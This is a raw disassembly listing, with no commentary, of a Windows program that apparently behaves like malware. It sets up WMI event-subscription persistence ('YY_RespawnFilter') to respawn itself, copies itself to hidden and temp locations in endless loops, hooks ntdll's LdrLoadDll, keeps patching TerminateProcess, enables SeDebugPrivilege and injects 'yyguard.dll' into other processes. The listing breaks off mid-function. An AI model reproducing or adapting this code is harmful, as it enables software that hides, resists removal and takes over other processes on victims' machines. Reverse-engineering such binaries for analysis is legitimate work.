movups  [rbp+0C80h+var_C80], xmm0
movups  xmm0, cs:xmmword_140008960
movups  [rbp+0C80h+var_C58], xmm1
movups  [rbp+0C80h+var_C68], xmm0
movups  xmm0, cs:xmmword_140008980
movups  [rbp+0C80h+var_C48], xmm0
call    cs:GetModuleFileNameW
test    eax, eax
jz      loc_1400027CC
lea     r8, [rbp+0C80h+Filename] ; Source
mov     edx, 104h       ; SizeInWords
lea     rcx, [rbp+0C80h+Destination] ; Destination
call    cs:wcscpy_s
mov     edx, 5Ch ; '\'  ; Ch
lea     rcx, [rbp+0C80h+Destination] ; Str
call    cs:wcsrchr
test    rax, rax
jz      short loc_1400022EF
lea     r8, Source      ; "yyres.bin"
mov     [rax+2], bx
mov     edx, 104h       ; SizeInWords
lea     rcx, [rbp+0C80h+Destination] ; Destination
call    cs:wcscat_s

loc_1400022EF:
lea     rax, [rbp+0C80h+Filename]
mov     qword ptr [rsp+0D80h+dwImpLevel], rax
lea     r9, [rbp+0C80h+Destination]
lea     rax, [rbp+0C80h+Filename]
lea     r8, [rbp+0C80h+Filename]
mov     [rsp+0D80h+ppv], rax
lea     rdx, aCmdExeCIfNotEx ; "cmd.exe /c if not exist \"%s\" copy /y "...
lea     rcx, [rbp+0C80h+psz] ; Buffer
call    sub_140005380
lea     rax, [rbp+0C80h+var_CF0]
xor     edx, edx        ; pUnkOuter
lea     r9, riid        ; riid
mov     [rsp+0D80h+ppv], rax ; ppv
mov     r8d, 1          ; dwClsContext
lea     rcx, rclsid     ; rclsid
call    cs:CoCreateInstance
test    eax, eax
js      loc_1400027CC
mov     rcx, [rbp+0C80h+var_CF0]
test    rcx, rcx
jz      loc_1400027CC
mov     rax, [rcx]
lea     rdx, [rsp+0D80h+pProxy]
mov     [rsp+0D80h+var_D40], rdx
xor     r9d, r9d
mov     qword ptr [rsp+0D80h+dwCapabilities], rbx
lea     rdx, [rbp+0C80h+var_CD8]
mov     [rsp+0D80h+pAuthInfo], rbx
xor     r8d, r8d
mov     [rsp+0D80h+dwImpLevel], ebx
mov     [rsp+0D80h+ppv], rbx
call    qword ptr [rax+18h]
test    eax, eax
js      loc_1400027C2
mov     rcx, [rsp+0D80h+pProxy] ; pProxy
test    rcx, rcx
jz      loc_1400027C2
mov     [rsp+0D80h+dwCapabilities], ebx ; dwCapabilities
xor     r9d, r9d        ; pServerPrincName
mov     [rsp+0D80h+pAuthInfo], rbx ; pAuthInfo
xor     r8d, r8d        ; dwAuthzSvc
mov     [rsp+0D80h+dwImpLevel], 3 ; dwImpLevel
mov     edx, 0Ah        ; dwAuthnSvc
mov     dword ptr [rsp+0D80h+ppv], 3 ; dwAuthnLevel
; } // starts at 140002237

loc_1400023C0:
; __unwind { // __GSHandlerCheck
mov     [rsp+0D80h+arg_8], rdi
call    cs:CoSetProxyBlanket
lea     rcx, [rsp+0D80h+pvarg] ; pvarg
mov     [rbp+0C80h+var_CE0], rbx
mov     [rsp+0D80h+var_D10], rbx
mov     [rbp+0C80h+var_CE8], rbx
mov     [rbp+0C80h+var_CF8], rbx
mov     [rbp+0C80h+var_D00], rbx
mov     [rsp+0D80h+var_D08], rbx
call    cs:VariantInit
mov     rcx, [rsp+0D80h+pProxy]
lea     rdx, [rbp+0C80h+var_CE0]
mov     qword ptr [rsp+0D80h+dwImpLevel], rbx
xor     r9d, r9d
mov     [rsp+0D80h+ppv], rdx
xor     r8d, r8d
lea     rdx, [rbp+0C80h+var_CC0]
mov     rax, [rcx]
call    qword ptr [rax+30h]
mov     edi, 8
test    eax, eax
js      loc_14000256B
mov     rcx, [rbp+0C80h+var_CE0]
test    rcx, rcx
jz      loc_14000256B
mov     rax, [rcx]
lea     r8, [rsp+0D80h+var_D10]
xor     edx, edx
call    qword ptr [rax+78h]
test    eax, eax
js      loc_14000256B
cmp     [rsp+0D80h+var_D10], rbx
jz      loc_14000256B
lea     rcx, psz        ; "YY_RespawnFilter"
mov     word ptr [rsp+0D80h+pvarg.anonymous_0], di
call    cs:SysAllocString
mov     rcx, [rsp+0D80h+var_D10]
lea     r9, [rsp+0D80h+pvarg]
mov     qword ptr [rsp+0D80h+pvarg.anonymous_0+8], rax
lea     rdx, aName      ; "Name"
xor     r8d, r8d
mov     dword ptr [rsp+0D80h+ppv], ebx
mov     rax, [rcx]
call    qword ptr [rax+28h]
lea     rcx, [rsp+0D80h+pvarg] ; pvarg
call    cs:VariantClear
lea     rcx, aWql       ; "WQL"
mov     word ptr [rsp+0D80h+pvarg.anonymous_0], di
call    cs:SysAllocString
mov     rcx, [rsp+0D80h+var_D10]
lea     r9, [rsp+0D80h+pvarg]
mov     qword ptr [rsp+0D80h+pvarg.anonymous_0+8], rax
lea     rdx, aQuerylanguage ; "QueryLanguage"
xor     r8d, r8d
mov     dword ptr [rsp+0D80h+ppv], ebx
mov     rax, [rcx]
call    qword ptr [rax+28h]
lea     rcx, [rsp+0D80h+pvarg] ; pvarg
call    cs:VariantClear
lea     rcx, aRootCimv2 ; "root\\cimv2"
mov     word ptr [rsp+0D80h+pvarg.anonymous_0], di
call    cs:SysAllocString
mov     rcx, [rsp+0D80h+var_D10]
lea     r9, [rsp+0D80h+pvarg]
mov     qword ptr [rsp+0D80h+pvarg.anonymous_0+8], rax
lea     rdx, aEventnamespace ; "EventNamespace"
xor     r8d, r8d
mov     dword ptr [rsp+0D80h+ppv], ebx
mov     rax, [rcx]
call    qword ptr [rax+28h]
lea     rcx, [rsp+0D80h+pvarg] ; pvarg
call    cs:VariantClear
lea     rcx, aSelectFromInst ; "SELECT * FROM __InstanceDeletionEvent W"...
mov     word ptr [rsp+0D80h+pvarg.anonymous_0], di
call    cs:SysAllocString
mov     rcx, [rsp+0D80h+var_D10]
lea     r9, [rsp+0D80h+pvarg]
mov     qword ptr [rsp+0D80h+pvarg.anonymous_0+8], rax
lea     rdx, aQuery     ; "Query"
xor     r8d, r8d
mov     dword ptr [rsp+0D80h+ppv], ebx
mov     rax, [rcx]
call    qword ptr [rax+28h]
lea     rcx, [rsp+0D80h+pvarg] ; pvarg
call    cs:VariantClear
mov     rcx, [rsp+0D80h+pProxy]
xor     r9d, r9d
mov     rdx, [rsp+0D80h+var_D10]
xor     r8d, r8d
mov     [rsp+0D80h+ppv], rbx
mov     rax, [rcx]
call    qword ptr [rax+70h]

loc_14000256B:
mov     rcx, [rsp+0D80h+pProxy]
lea     rdx, [rbp+0C80h+var_CE8]
mov     qword ptr [rsp+0D80h+dwImpLevel], rbx
xor     r9d, r9d
mov     [rsp+0D80h+ppv], rdx
xor     r8d, r8d
lea     rdx, [rbp+0C80h+var_CA0]
mov     rax, [rcx]
call    qword ptr [rax+30h]
test    eax, eax
js      loc_140002659
mov     rcx, [rbp+0C80h+var_CE8]
test    rcx, rcx
jz      loc_140002659
mov     rax, [rcx]
lea     r8, [rbp+0C80h+var_CF8]
xor     edx, edx
call    qword ptr [rax+78h]
test    eax, eax
js      loc_140002659
cmp     [rbp+0C80h+var_CF8], rbx
jz      loc_140002659
lea     rcx, aYyRespawnconsu ; "YY_RespawnConsumer"
mov     word ptr [rsp+0D80h+pvarg.anonymous_0], di
call    cs:SysAllocString
mov     rcx, [rbp+0C80h+var_CF8]
lea     r9, [rsp+0D80h+pvarg]
mov     qword ptr [rsp+0D80h+pvarg.anonymous_0+8], rax
lea     rdx, aName      ; "Name"
xor     r8d, r8d
mov     dword ptr [rsp+0D80h+ppv], ebx
mov     rax, [rcx]
call    qword ptr [rax+28h]
lea     rcx, [rsp+0D80h+pvarg] ; pvarg
call    cs:VariantClear
lea     rcx, [rbp+0C80h+psz] ; psz
mov     word ptr [rsp+0D80h+pvarg.anonymous_0], di
call    cs:SysAllocString
mov     rcx, [rbp+0C80h+var_CF8]
lea     r9, [rsp+0D80h+pvarg]
mov     qword ptr [rsp+0D80h+pvarg.anonymous_0+8], rax
lea     rdx, aCommandlinetem ; "CommandLineTemplate"
xor     r8d, r8d
mov     dword ptr [rsp+0D80h+ppv], ebx
mov     rax, [rcx]
call    qword ptr [rax+28h]
lea     rcx, [rsp+0D80h+pvarg] ; pvarg
call    cs:VariantClear
mov     rcx, [rsp+0D80h+pProxy]
xor     r9d, r9d
mov     rdx, [rbp+0C80h+var_CF8]
xor     r8d, r8d
mov     [rsp+0D80h+ppv], rbx
mov     rax, [rcx]
call    qword ptr [rax+70h]

loc_140002659:
mov     rcx, [rsp+0D80h+pProxy]
lea     rdx, [rbp+0C80h+var_D00]
mov     qword ptr [rsp+0D80h+dwImpLevel], rbx
xor     r9d, r9d
mov     [rsp+0D80h+ppv], rdx
xor     r8d, r8d
lea     rdx, [rbp+0C80h+var_C68]
mov     rax, [rcx]
call    qword ptr [rax+30h]
test    eax, eax
js      loc_14000274C
mov     rcx, [rbp+0C80h+var_D00]
test    rcx, rcx
jz      loc_140002750
mov     rax, [rcx]
lea     r8, [rsp+0D80h+var_D08]
xor     edx, edx
call    qword ptr [rax+78h]
test    eax, eax
js      loc_14000274C
cmp     [rsp+0D80h+var_D08], rbx
jz      loc_140002763
lea     rcx, aEventfilterNam ; "__EventFilter.Name=\"YY_RespawnFilter\""
mov     word ptr [rsp+0D80h+pvarg.anonymous_0], di
call    cs:SysAllocString
mov     rcx, [rsp+0D80h+var_D08]
lea     r9, [rsp+0D80h+pvarg]
mov     qword ptr [rsp+0D80h+pvarg.anonymous_0+8], rax
lea     rdx, aFilter    ; "Filter"
xor     r8d, r8d
mov     dword ptr [rsp+0D80h+ppv], ebx
mov     rax, [rcx]
call    qword ptr [rax+28h]
lea     rcx, [rsp+0D80h+pvarg] ; pvarg
call    cs:VariantClear
lea     rcx, aCommandlineeve ; "CommandLineEventConsumer.Name=\"YY_Resp"...
mov     word ptr [rsp+0D80h+pvarg.anonymous_0], di
call    cs:SysAllocString
mov     rcx, [rsp+0D80h+var_D08]
lea     r9, [rsp+0D80h+pvarg]
mov     qword ptr [rsp+0D80h+pvarg.anonymous_0+8], rax
lea     rdx, aConsumer  ; "Consumer"
xor     r8d, r8d
mov     dword ptr [rsp+0D80h+ppv], ebx
mov     rax, [rcx]
call    qword ptr [rax+28h]
lea     rcx, [rsp+0D80h+pvarg] ; pvarg
call    cs:VariantClear
mov     rcx, [rsp+0D80h+pProxy]
xor     r9d, r9d
mov     rdx, [rsp+0D80h+var_D08]
xor     r8d, r8d
mov     [rsp+0D80h+ppv], rbx
mov     rax, [rcx]
call    qword ptr [rax+70h]

loc_14000274C:
mov     rcx, [rbp+0C80h+var_D00]

loc_140002750:
mov     rdx, [rsp+0D80h+var_D08]
test    rdx, rdx
jz      short loc_140002767
mov     rax, [rdx]
mov     rcx, rdx
call    qword ptr [rax+10h]

loc_140002763:
mov     rcx, [rbp+0C80h+var_D00]

loc_140002767:
mov     rdi, [rsp+0D80h+arg_8]
test    rcx, rcx
jz      short loc_14000277A
; } // starts at 1400023C0

loc_140002774:
; __unwind { // __GSHandlerCheck
mov     rax, [rcx]
call    qword ptr [rax+10h]

loc_14000277A:
mov     rcx, [rbp+0C80h+var_CF8]
test    rcx, rcx
jz      short loc_140002789
mov     rax, [rcx]
call    qword ptr [rax+10h]

loc_140002789:
mov     rcx, [rbp+0C80h+var_CE8]
test    rcx, rcx
jz      short loc_140002798
mov     rax, [rcx]
call    qword ptr [rax+10h]

loc_140002798:
mov     rcx, [rsp+0D80h+var_D10]
test    rcx, rcx
jz      short loc_1400027A8
mov     rax, [rcx]
call    qword ptr [rax+10h]

loc_1400027A8:
mov     rcx, [rbp+0C80h+var_CE0]
test    rcx, rcx
jz      short loc_1400027B7
mov     rax, [rcx]
call    qword ptr [rax+10h]

loc_1400027B7:
mov     rcx, [rsp+0D80h+pProxy]
mov     rax, [rcx]
call    qword ptr [rax+10h]

loc_1400027C2:
mov     rcx, [rbp+0C80h+var_CF0]
mov     rax, [rcx]
call    qword ptr [rax+10h]

loc_1400027CC:
call    cs:CoUninitialize
mov     rbx, [rsp+0D80h+arg_0]
; } // starts at 140002774

loc_1400027DA:
; __unwind { // __GSHandlerCheck
mov     rcx, [rbp+0C80h+var_10]
xor     rcx, rsp        ; StackCookie
call    __security_check_cookie
add     rsp, 0D80h
pop     rbp
retn
; } // starts at 1400027DA
sub_1400021C0 endp

algn_1400027F2:
align 20h


; Attributes: noreturn

; DWORD __stdcall sub_140002800(LPVOID lpThreadParameter)
sub_140002800 proc near
sub     rsp, 28h

loc_140002804:
call    sub_1400021C0
mov     ecx, 2710h      ; dwMilliseconds
call    cs:Sleep
jmp     short loc_140002804
sub_140002800 endp

algn_140002816:
align 20h


; Attributes: noreturn

; DWORD __stdcall sub_140002820(LPVOID lpThreadParameter)
sub_140002820 proc near

Destination= word ptr -648h
Buffer= word ptr -438h
Filename= word ptr -228h
var_18= qword ptr -18h

; __unwind { // __GSHandlerCheck
sub     rsp, 668h
mov     rax, cs:__security_cookie
xor     rax, rsp
mov     [rsp+668h+var_18], rax
mov     r8d, 104h       ; nSize
lea     rdx, [rsp+668h+Filename] ; lpFilename
xor     ecx, ecx        ; hModule
call    cs:GetModuleFileNameW
lea     r8, [rsp+668h+Filename] ; Source
mov     edx, 104h       ; SizeInWords
lea     rcx, [rsp+668h+Destination] ; Destination
call    cs:wcscpy_s
mov     edx, 5Ch ; '\'  ; Ch
lea     rcx, [rsp+668h+Destination] ; Str
call    cs:wcsrchr
test    rax, rax
jz      short loc_140002899
xor     ecx, ecx
lea     r8, Source      ; "yyres.bin"
mov     [rax+2], cx
mov     edx, 104h       ; SizeInWords
lea     rcx, [rsp+668h+Destination] ; Destination
call    cs:wcscat_s

loc_140002899:          ; lpBuffer
lea     rdx, [rsp+668h+Buffer]
mov     ecx, 104h       ; nBufferLength
call    cs:GetTempPathW
lea     r8, aYyBackup7f3a9c ; "yy_backup_7f3a9c1e.dat"
mov     edx, 104h       ; SizeInWords
lea     rcx, [rsp+668h+Buffer] ; Destination
call    cs:wcscat_s
db      66h, 66h
nop     word ptr [rax+rax+00000000h]

loc_1400028D0:          ; lpFileName
lea     rcx, [rsp+668h+Destination]
call    cs:GetFileAttributesW
cmp     eax, 0FFFFFFFFh
jnz     short loc_1400028F6
xor     r8d, r8d        ; bFailIfExists
lea     rdx, [rsp+668h+Destination] ; lpNewFileName
lea     rcx, [rsp+668h+Filename] ; lpExistingFileName
call    cs:CopyFileW

loc_1400028F6:          ; lpFileName
lea     rcx, [rsp+668h+Buffer]
call    cs:GetFileAttributesW
cmp     eax, 0FFFFFFFFh
jnz     short loc_140002922
xor     r8d, r8d        ; bFailIfExists
lea     rdx, [rsp+668h+Buffer] ; lpNewFileName
lea     rcx, [rsp+668h+Filename] ; lpExistingFileName
call    cs:CopyFileW

loc_140002922:          ; dwMilliseconds
mov     ecx, 3E8h
call    cs:Sleep
jmp     short loc_1400028D0
; } // starts at 140002820
sub_140002820 endp

algn_14000292F:
align 10h



sub_140002930 proc near

var_58= xmmword ptr -58h
var_48= qword ptr -48h
var_40= qword ptr -40h

; __unwind { // __CxxFrameHandler4
push    rbx
push    rbp
push    rsi
push    rdi
push    r14
push    r15
sub     rsp, 48h
mov     r14, r9
mov     rdi, r8
mov     rbp, rdx
mov     rsi, rcx
test    r8, r8
jz      short loc_14000298C
mov     rcx, [r8+8]     ; Str
test    rcx, rcx
jz      short loc_14000298C
lea     rdx, SubStr     ; "yyguard.dll"
call    cs:wcsstr
test    rax, rax
jnz     short loc_14000298C
xor     ebx, ebx
lea     r15, lpString2

loc_140002972:          ; SubStr
mov     rdx, [r15+rbx*8]
mov     rcx, [rdi+8]    ; Str
call    cs:wcsstr
test    rax, rax
jnz     short loc_1400029AE
inc     ebx
cmp     ebx, 7
jl      short loc_140002972

loc_14000298C:
mov     r9, r14
mov     r8, rdi
mov     rdx, rbp
mov     rcx, rsi
mov     rax, cs:qword_14000C510
add     rsp, 48h
pop     r15
pop     r14
pop     rdi
pop     rsi
pop     rbp
pop     rbx
jmp     rax

loc_1400029AE:
xorps   xmm0, xmm0
movups  [rsp+78h+var_58], xmm0
mov     [rsp+78h+var_48], 0
mov     [rsp+78h+var_40], 0
mov     ecx, 50h ; 'P'  ; Size
call    sub_1400062C0
mov     rcx, rax
mov     qword ptr [rsp+78h+var_58], rax
mov     [rsp+78h+var_48], 41h ; 'A'
mov     [rsp+78h+var_40], 4Fh ; 'O'
movaps  xmm0, cs:xmmword_140008D40
movups  xmmword ptr [rax], xmm0
movaps  xmm1, cs:xmmword_140008D50
movups  xmmword ptr [rax+10h], xmm1
movaps  xmm0, cs:xmmword_140008D60
movups  xmmword ptr [rax+20h], xmm0
movaps  xmm1, cs:xmmword_140008D70
movups  xmmword ptr [rax+30h], xmm1
movzx   eax, cs:byte_140008D80
mov     [rcx+40h], al
mov     byte ptr [rcx+41h], 0
lea     rcx, [rsp+78h+var_58]
call    sub_140001780
nop
mov     rdx, [rsp+78h+var_40]
cmp     rdx, 0Fh
jbe     short loc_140002A69
inc     rdx
mov     rcx, qword ptr [rsp+78h+var_58]
cmp     rdx, 1000h
jb      short loc_140002A64
mov     rax, [rcx-8]
sub     rcx, rax
sub     rcx, 8
cmp     rcx, 1Fh
ja      short loc_140002A7B
add     rdx, 27h ; '''
mov     rcx, rax        ; Block

loc_140002A64:
call    j_j_free

loc_140002A69:
mov     eax, 0C0000022h
add     rsp, 48h
pop     r15
pop     r14
pop     rdi
pop     rsi
pop     rbp
pop     rbx
retn

loc_140002A7B:
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)
; } // starts at 140002930
sub_140002930 endp

algn_140002A82:
align 10h


; Attributes: bp-based frame

sub_140002A90 proc near

var_38= xmmword ptr -38h
var_28= qword ptr -28h
var_20= qword ptr -20h
flOldProtect= dword ptr -18h
var_10= qword ptr -10h

; __unwind { // sub_140007150
push    rbp
push    rbx
push    rsi
push    rdi
push    r14
push    r15
mov     rbp, rsp
sub     rsp, 58h
mov     rax, cs:__security_cookie
xor     rax, rsp
mov     [rbp+var_10], rax
lea     rcx, ModuleName ; "ntdll.dll"
call    cs:GetModuleHandleA
test    rax, rax
jz      loc_140002D08
lea     rdx, ProcName   ; "LdrLoadDll"
mov     rcx, rax        ; hModule
call    cs:GetProcAddress
mov     rsi, rax
test    rax, rax
jz      loc_140002D08
xor     r15d, r15d
mov     ebx, r15d

loc_140002AE6:
lea     rcx, [rbx+rsi]
call    sub_140001230
test    rax, rax
jz      short loc_140002B63
add     rbx, rax
cmp     rbx, 80h
ja      short loc_140002B63
cmp     rbx, 0Eh
jb      short loc_140002AE6
mov     r9d, 4          ; flProtect
mov     r8d, 3000h      ; flAllocationType
lea     rdx, [rbx+0Ch]  ; dwSize
xor     ecx, ecx        ; lpAddress
call    cs:VirtualAlloc
mov     rdi, rax
test    rax, rax
jz      short loc_140002B63
mov     r8, rbx         ; Size
mov     rdx, rsi        ; Src
mov     rcx, rax        ; void *
call    memcpy
lea     rax, [rbx+rsi]
mov     word ptr [rdi+rbx], 0B848h
mov     [rdi+rbx+2], rax
mov     word ptr [rdi+rbx+0Ah], 0E0FFh
lea     r9, [rbp+flOldProtect] ; lpflOldProtect
mov     r8d, 20h ; ' '  ; flNewProtect
lea     rdx, [rbx+0Ch]  ; dwSize
mov     rcx, rdi        ; lpAddress
call    cs:VirtualProtect
jmp     short loc_140002B66

loc_140002B63:
mov     rdi, r15

loc_140002B66:
test    rdi, rdi
jnz     short loc_140002BC9
xorps   xmm0, xmm0
movups  [rbp+var_38], xmm0
mov     [rbp+var_28], r15
mov     [rbp+var_20], r15
mov     ecx, 30h ; '0'  ; Size
call    sub_1400062C0
mov     qword ptr [rbp+var_38], rax
mov     [rbp+var_28], 24h ; '$'
mov     [rbp+var_20], 2Fh ; '/'
movups  xmm0, cs:xmmword_140008DA8
movups  xmmword ptr [rax], xmm0
movups  xmm1, cs:xmmword_140008DB8
movups  xmmword ptr [rax+10h], xmm1
mov     ecx, cs:dword_140008DC8
mov     [rax+20h], ecx
mov     [rax+24h], r15b
lea     rcx, [rbp+var_38]
call    sub_140001780
nop
jmp     loc_140002CD1

loc_140002BC9:
mov     cs:qword_14000C510, rdi
lea     r9, [rbp+flOldProtect] ; lpflOldProtect
mov     edx, 0Ch        ; dwSize
mov     r8d, 40h ; '@'  ; flNewProtect
mov     rcx, rsi        ; lpAddress
call    cs:VirtualProtect
test    eax, eax
jnz     short loc_140002C41
xorps   xmm0, xmm0
movups  [rbp+var_38], xmm0
mov     [rbp+var_28], r15
mov     [rbp+var_20], r15
mov     ecx, 30h ; '0'  ; Size
call    sub_1400062C0
mov     qword ptr [rbp+var_38], rax
mov     [rbp+var_28], 20h ; ' '
mov     [rbp+var_20], 2Fh ; '/'
movups  xmm0, cs:xmmword_140008DD0
movups  xmmword ptr [rax], xmm0
movups  xmm1, cs:xmmword_140008DE0
movups  xmmword ptr [rax+10h], xmm1
mov     [rax+20h], r15b
lea     rcx, [rbp+var_38]
call    sub_140001780
nop
jmp     loc_140002CD1

loc_140002C41:
mov     word ptr [rsi], 0B848h
lea     rax, sub_140002930
mov     [rsi+2], rax
mov     word ptr [rsi+0Ah], 0E0FFh
lea     r9, [rbp+flOldProtect] ; lpflOldProtect
mov     r8d, [rbp+flOldProtect] ; flNewProtect
mov     edx, 0Ch        ; dwSize
mov     rcx, rsi        ; lpAddress
call    cs:VirtualProtect
xorps   xmm0, xmm0
movups  [rbp+var_38], xmm0
mov     [rbp+var_28], r15
mov     [rbp+var_20], r15
mov     ecx, 40h ; '@'  ; Size
call    sub_1400062C0
mov     qword ptr [rbp+var_38], rax
mov     [rbp+var_28], 33h ; '3'
mov     [rbp+var_20], 3Fh ; '?'
movups  xmm0, cs:xmmword_140008DF8
movups  xmmword ptr [rax], xmm0
movups  xmm1, cs:xmmword_140008E08
movups  xmmword ptr [rax+10h], xmm1
movups  xmm0, cs:xmmword_140008E18
movups  xmmword ptr [rax+20h], xmm0
mov     ecx, dword ptr cs:xmmword_140008E18+0Fh
mov     [rax+2Fh], ecx
mov     [rax+33h], r15b
lea     rcx, [rbp+var_38]
call    sub_140001780
nop

loc_140002CD1:
mov     rdx, [rbp+var_20]
cmp     rdx, 0Fh
jbe     short loc_140002D08
inc     rdx
mov     rcx, qword ptr [rbp+var_38]
cmp     rdx, 1000h
jb      short loc_140002D03
mov     rax, [rcx-8]
sub     rcx, rax
sub     rcx, 8
cmp     rcx, 1Fh
ja      short loc_140002D21
add     rdx, 27h ; '''
mov     rcx, rax        ; Block

loc_140002D03:
call    j_j_free

loc_140002D08:
mov     rcx, [rbp+var_10]
xor     rcx, rsp        ; StackCookie
call    __security_check_cookie
add     rsp, 58h
pop     r15
pop     r14
pop     rdi
pop     rsi
pop     rbx
pop     rbp
retn

loc_140002D21:
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)
; } // starts at 140002A90
sub_140002A90 endp

algn_140002D28:
align 10h



; DWORD __stdcall sub_140002D30(LPVOID lpThreadParameter)
sub_140002D30 proc near

flOldProtect= dword ptr -18h
var_10= qword ptr -10h
arg_0= qword ptr  8
arg_8= qword ptr  10h

; __unwind { // __GSHandlerCheck
mov     [rsp+arg_8], rsi
push    rdi
sub     rsp, 30h
mov     rax, cs:__security_cookie
xor     rax, rsp
mov     [rsp+38h+var_10], rax
lea     rcx, aKernel32Dll_0 ; "kernel32.dll"
call    cs:GetModuleHandleA
test    rax, rax
jz      short loc_140002D7D
lea     rdx, aTerminateproce ; "TerminateProcess"
; } // starts at 140002D30

loc_140002D62:
; __unwind { // __GSHandlerCheck
mov     [rsp+38h+arg_0], rbx
mov     rcx, rax        ; hModule
call    cs:GetProcAddress
mov     rbx, rax
test    rax, rax
jnz     short loc_140002D97
mov     rbx, [rsp+38h+arg_0]
; } // starts at 140002D62

loc_140002D7D:
; __unwind { // __GSHandlerCheck
xor     eax, eax
mov     rcx, [rsp+38h+var_10]
xor     rcx, rsp        ; StackCookie
call    __security_check_cookie
mov     rsi, [rsp+38h+arg_8]
add     rsp, 30h
pop     rdi
retn
; } // starts at 140002D7D

loc_140002D97:
; __unwind { // __GSHandlerCheck
mov     edi, [rax]
movzx   esi, byte ptr [rax+4]
nop     dword ptr [rax]

loc_140002DA0:          ; lpflOldProtect
lea     r9, [rsp+38h+flOldProtect]
mov     edx, 5          ; dwSize
mov     r8d, 40h ; '@'  ; flNewProtect
mov     rcx, rbx        ; lpAddress
call    cs:VirtualProtect
test    eax, eax
jz      short loc_140002DDB
mov     r8d, [rsp+38h+flOldProtect] ; flNewProtect
lea     r9, [rsp+38h+flOldProtect] ; lpflOldProtect
mov     [rbx], edi
mov     edx, 5          ; dwSize
mov     rcx, rbx        ; lpAddress
mov     [rbx+4], sil
call    cs:VirtualProtect

loc_140002DDB:          ; dwMilliseconds
mov     ecx, 1Eh
call    cs:Sleep
jmp     short loc_140002DA0
; } // starts at 140002D97
sub_140002D30 endp

algn_140002DE8:
align 10h



sub_140002DF0 proc near

PreviousState= qword ptr -48h
ReturnLength= qword ptr -40h
TokenHandle= qword ptr -38h
Luid= _LUID ptr -30h
NewState= _TOKEN_PRIVILEGES ptr -28h
var_18= qword ptr -18h

; __unwind { // __GSHandlerCheck
push    rbx
sub     rsp, 60h
mov     rax, cs:__security_cookie
xor     rax, rsp
mov     [rsp+68h+var_18], rax
xor     ebx, ebx
xorps   xmm0, xmm0
mov     [rsp+68h+TokenHandle], rbx
mov     qword ptr [rsp+68h+Luid.LowPart], rbx
movups  xmmword ptr [rsp+68h+NewState.PrivilegeCount], xmm0
call    cs:GetCurrentProcess
lea     r8, [rsp+68h+TokenHandle] ; TokenHandle
mov     edx, 28h ; '('  ; DesiredAccess
mov     rcx, rax        ; ProcessHandle
call    cs:OpenProcessToken
test    eax, eax
jz      loc_140002EC6
lea     r8, [rsp+68h+Luid] ; lpLuid
xor     ecx, ecx        ; lpSystemName
lea     rdx, Name       ; "SeDebugPrivilege"
call    cs:LookupPrivilegeValueW
test    eax, eax
jz      short loc_140002EBB
mov     rax, qword ptr [rsp+68h+Luid.LowPart]
lea     r8, [rsp+68h+NewState] ; NewState
mov     rcx, [rsp+68h+TokenHandle] ; TokenHandle
mov     r9d, 10h        ; BufferLength
mov     [rsp+68h+ReturnLength], rbx ; ReturnLength
xor     edx, edx        ; DisableAllPrivileges
mov     qword ptr [rsp+68h+NewState.Privileges.Luid.LowPart], rax
mov     [rsp+68h+NewState.PrivilegeCount], 1
mov     [rsp+68h+NewState.Privileges.Attributes], 2
mov     [rsp+68h+PreviousState], rbx ; PreviousState
call    cs:AdjustTokenPrivileges
test    eax, eax
jz      short loc_140002EBB
mov     rcx, [rsp+68h+TokenHandle] ; hObject
call    cs:CloseHandle
call    cs:GetLastError
test    eax, eax
setz    al
mov     rcx, [rsp+68h+var_18]
xor     rcx, rsp        ; StackCookie
call    __security_check_cookie
add     rsp, 60h
pop     rbx
retn

loc_140002EBB:          ; hObject
mov     rcx, [rsp+68h+TokenHandle]
call    cs:CloseHandle

loc_140002EC6:
xor     al, al
mov     rcx, [rsp+68h+var_18]
xor     rcx, rsp        ; StackCookie
call    __security_check_cookie
add     rsp, 60h
pop     rbx
retn
; } // starts at 140002DF0
sub_140002DF0 endp

algn_140002EDB:
align 20h


; Attributes: noreturn bp-based frame fpd=660h

; DWORD __stdcall sub_140002EE0(LPVOID lpThreadParameter)
sub_140002EE0 proc near

flProtect= dword ptr -740h
dwCreationFlags= dword ptr -738h
lpThreadId= qword ptr -730h
var_720= dword ptr -720h
var_718= xmmword ptr -718h
var_708= xmmword ptr -708h
var_6F8= xmmword ptr -6F8h
var_6E8= xmmword ptr -6E8h
Src= qword ptr -6D8h
var_6C8= qword ptr -6C8h
var_6C0= qword ptr -6C0h
pe= PROCESSENTRY32W ptr -6B0h
Destination= word ptr -470h
Filename= word ptr -260h
var_50= qword ptr -50h

; __unwind { // sub_140007150
push    rbp
push    rbx
push    rsi
push    rdi
push    r12
push    r13
push    r14
push    r15
lea     rbp, [rsp-628h]
sub     rsp, 728h
mov     rax, cs:__security_cookie
xor     rax, rsp
mov     [rbp+660h+var_50], rax
call    sub_140002DF0
mov     r8d, 104h       ; nSize
lea     rdx, [rbp+660h+Filename] ; lpFilename
xor     ecx, ecx        ; hModule
call    cs:GetModuleFileNameW
mov     edx, 5Ch ; '\'  ; Ch
lea     rcx, [rbp+660h+Filename] ; Str
call    cs:wcsrchr
test    rax, rax
jz      short loc_140002F44
xor     ecx, ecx
mov     [rax+2], cx

loc_140002F44:          ; Source
lea     r8, [rbp+660h+Filename]
mov     edx, 104h       ; SizeInWords
lea     rcx, [rbp+660h+Destination] ; Destination
call    cs:wcscpy_s
lea     r8, SubStr      ; "yyguard.dll"
mov     edx, 104h       ; SizeInWords
lea     rcx, [rbp+660h+Destination] ; Destination
call    cs:wcscat_s
xor     ebx, ebx
mov     [rsp+760h+var_720], ebx
lea     r14, aSpreadYyguardD+22h ; ""
lea     rsi, aSpreadYyguardD ; "Spread: yyguard.dll injected into "

loc_140002F8A:
lea     rdi, off_140009280 ; "System"
xor     r12d, r12d
xor     edx, edx        ; th32ProcessID
mov     ecx, 2          ; dwFlags
call    cs:CreateToolhelp32Snapshot
mov     r13, rax
cmp     rax, 0FFFFFFFFFFFFFFFFh
jz      loc_1400031DE
mov     [rbp+660h+pe.dwSize], 238h
xor     edx, edx        ; Val
mov     r8d, 234h       ; Size
lea     rcx, [rbp+660h+pe.cntUsage] ; void *
call    memset
lea     rdx, [rbp+660h+pe] ; lppe
mov     rcx, r13        ; hSnapshot
call    cs:Process32FirstW
test    eax, eax
jz      loc_1400031D5
nop     dword ptr [rax+rax+00h]

loc_140002FE0:
cmp     [rbp+660h+pe.th32ProcessID], 4
jbe     loc_1400031A7
call    cs:GetCurrentProcessId
mov     r8d, [rbp+660h+pe.th32ProcessID]
cmp     r8d, eax
